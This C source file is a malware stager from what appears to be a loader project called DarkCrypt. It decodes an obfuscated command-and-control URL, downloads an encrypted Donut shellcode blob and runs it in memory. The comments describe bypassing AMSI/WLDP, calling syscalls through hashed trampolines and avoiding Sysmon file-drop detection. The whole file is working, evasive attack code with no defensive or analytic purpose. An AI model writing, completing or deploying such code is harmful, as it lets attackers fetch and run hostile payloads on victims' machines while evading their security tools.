/*
 * stager.c — tiny Donut-blob fetch + jump stager (in-memory stage).
 *
 * Flow:
 *   1. halos_init()  — persistent syscall trampoline (shared with loader).
 *   2. http_download() the Donut-encrypted shellcode blob over HTTPS.
 *   3. NtAllocateVirtualMemory  (RW) sized to the blob.
 *   4. memcpy blob into the fresh RW region, scrub + free the download buf.
 *   5. NtProtectVirtualMemory   RW -> RX.
 *   6. Jump into the blob entrypoint as a function call. The Donut stub
 *      performs its own AMSI/WLDP bypass, unpacks + decrypts the real PE,
 *      and runs its entrypoint on a new thread (donut -t).
 *   7. On return, the stager process exits.
 *
 * Nothing touches disk beyond the stager itself. The DarkCrypt loader PE
 * never materializes — kills the Sysmon Event 11 (file-drop) IOC the
 * monolithic build left behind.
 */

#include "http.h"
#include "halos.h"
#include "peb.h"
#include "obfuscation.h"

/* "https://<C2>:9443/update.bin" MB-XOR key_len=6 (39 bytes) */
static const uint8_t _enc_key_url[6]  = { 0x6e, 0x26, 0x7c, 0x52, 0xd5, 0xd0 };
static const uint8_t _enc_url[39]     = {
    0x06, 0x52, 0x08, 0x22, 0xa6, 0xea, 0x41, 0x09, 0x4d, 0x6b, 0xe7, 0xfe,
    0x5f, 0x10, 0x44, 0x7c, 0xe4, 0xe2, 0x5c, 0x08, 0x4d, 0x61, 0xe4, 0xea,
    0x57, 0x12, 0x48, 0x61, 0xfa, 0xa5, 0x1e, 0x42, 0x1d, 0x26, 0xb0, 0xfe,
    0x0c, 0x4f, 0x12
};
#define URL_LEN 39

int main(void)
{
    /* Keep camouflage padding reachable — stops --gc-sections removing it. */
    extern void *camouflage_get_pad(void);
    volatile void *_pad = camouflage_get_pad();
    (void)_pad;

    DBG_PRINTF("[stager] start\n");
    halos_init();
    DBG_PRINTF("[stager] halos_init returned\n");

    char url[64];
    xor_dec_mb(url, _enc_url, URL_LEN, _enc_key_url, 6);
    url[URL_LEN] = '\0';
    DBG_PRINTF("[stager] url decoded, calling http_download\n");

    uint8_t *blob     = NULL;
    size_t   blob_len = 0;
    BOOL ok = http_download(url, &blob, &blob_len);
    secure_zero(url, sizeof(url));
    if (!ok || !blob || blob_len < 1024) {
        DBG_PRINTF("[stager] http_download failed or blob too small (len=%zu)\n", blob_len);
        if (blob) { secure_zero(blob, blob_len); free(blob); }
        return 1;
    }
    DBG_PRINTF("[stager] downloaded %zu bytes\n", blob_len);

    /* NtAllocateVirtualMemory(RW) on self. NtCurrentProcess pseudo-handle = (HANDLE)-1. */
    HANDLE hSelf        = (HANDLE)(ULONG_PTR)-1;
    PVOID  base         = NULL;
    SIZE_T region_size  = blob_len;
    NTSTATUS st = halos_invoke_hash(HASH_NtAllocateVirtualMemory,
        hSelf, &base, (void *)0, &region_size,
        (void *)(MEM_COMMIT | MEM_RESERVE), (void *)PAGE_READWRITE);
    if (st != 0 || !base) {
        DBG_PRINTF("[stager] NtAllocateVirtualMemory failed: 0x%lX\n", (unsigned long)st);
        secure_zero(blob, blob_len); free(blob);
        return 2;
    }
    DBG_PRINTF("[stager] alloc RW %zu bytes at %p\n", (size_t)region_size, base);

    /* memcpy blob into the fresh region, scrub the download buffer. */
    memcpy(base, blob, blob_len);
    secure_zero(blob, blob_len);
    free(blob);
    blob = NULL;

    /* NtProtectVirtualMemory RW -> RX. */
    ULONG  old_prot      = 0;
    PVOID  protect_base  = base;
    SIZE_T protect_size  = blob_len;
    st = halos_invoke_hash(HASH_NtProtectVirtualMemory,
        hSelf, &protect_base, &protect_size,
        (void *)PAGE_EXECUTE_READ, &old_prot, NULL);
    if (st != 0) {
        DBG_PRINTF("[stager] NtProtectVirtualMemory failed: 0x%lX\n", (unsigned long)st);
        return 3;
    }
    DBG_PRINTF("[stager] flipped to RX, jumping to %p\n", base);

    /* Call into the Donut stub. donut -t means the stub starts a new
     * thread for the embedded PE's entrypoint; this call returns quickly
     * and the beacon's host thread runs on. */
    ((void (*)(void))base)();

    DBG_PRINTF("[stager] Donut stub returned; exiting\n");
    return 0;
}
